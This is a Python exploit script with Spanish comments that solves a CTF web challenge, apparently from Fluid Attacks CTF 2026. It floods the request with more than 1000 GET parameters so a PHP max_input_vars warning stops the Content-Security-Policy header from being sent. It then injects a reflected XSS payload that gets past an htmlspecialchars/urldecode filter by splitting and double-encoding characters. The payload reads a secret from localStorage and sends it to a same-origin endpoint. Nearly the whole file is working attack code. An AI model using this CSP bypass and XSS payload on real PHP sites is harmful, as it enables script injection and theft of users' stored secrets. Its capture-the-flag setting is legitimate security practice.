#!/usr/bin/env python3
# Warning Signs (Fluid Attacks CTF 2026, Web) -- PHP max_input_vars warning rompe la CSP + XSS reflejado.
# Uso:    ./warning_signs_csp_xss.py <base_url> [ticket]
# Ejemplo: ./warning_signs_csp_xss.py https://<host>.chal.ctf.ae ABC123
#
# 1) >1000 vars GET -> PHP emite "Input variables exceeded 1000" ANTES de index.php
#    -> header('CSP') da "headers already sent" -> respuesta SIN CSP.
# 2) XSS reflejado en $ref con bypass del scrub (htmlspecialchars luego urldecode):
#    - partir el '<' en el borde zone|sign: zone termina en %3, sign empieza con c -> %3c -> '<'
#    - doble-codificar " & > (sobreviven a htmlspecialchars, el urldecode final los restaura)
#    - backticks en el JS para evitar comillas
# 3) exfil same-origin: el bot (playwright) guarda /flag.txt en localStorage.duty_key; el svg/onload
#    lo lee y navega a /ledger (sink same-origin). Leer luego /ledger?ticket=<ticket>.

import sys, urllib.parse, urllib.request

BASE   = sys.argv[1].rstrip("/")
TICKET = sys.argv[2] if len(sys.argv) > 2 else "poc123"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

# --- payload XSS con doble-encoding y '<' partido entre 'zone' y 'sign' ---
# svg/onload lee localStorage.duty_key y lo exfiltra al sink same-origin /ledger
js = f"location=`/ledger?ticket={TICKET}&entry=${{localStorage.duty_key}}`"
# partes del tag, con " > & doble-codificados (%2522 %253e %2526 -> tras 1er urldecode %22/%3e/%26)
sign_tail = "svg/onload=%2522" + urllib.parse.quote(js, safe="`${}/?=&:.") + "%2522%253e"
params = {
    "zone": "%3",          # + 'c' de sign -> %3c -> '<'
    "sign": "c" + sign_tail,
    "ref":  "x",           # el parametro reflejado real (ajustar al del target)
}

# --- >1000 variables para gatillar el warning y tumbar la CSP ---
filler = "&".join(f"p{i}=1" for i in range(1100))
qs = urllib.parse.urlencode(params, safe="%`${}/?=&:.") + "&" + filler

url = f"{BASE}/panel?{qs}"
print(f"[*] enviando payload ({len(params)+1100} params) para romper CSP + inyectar XSS")
req = urllib.request.Request(url, headers={"User-Agent": UA})
with urllib.request.urlopen(req, timeout=15) as r:
    hdrs = {k.lower(): v for k, v in r.headers.items()}
    print("    CSP presente:", "content-security-policy" in hdrs, "(deberia ser False)")

print("[*] leyendo el sink same-origin /ledger (tras visita del bot):")
req2 = urllib.request.Request(f"{BASE}/ledger?ticket={TICKET}", headers={"User-Agent": UA})
with urllib.request.urlopen(req2, timeout=15) as r:
    print(r.read().decode(errors="replace"))
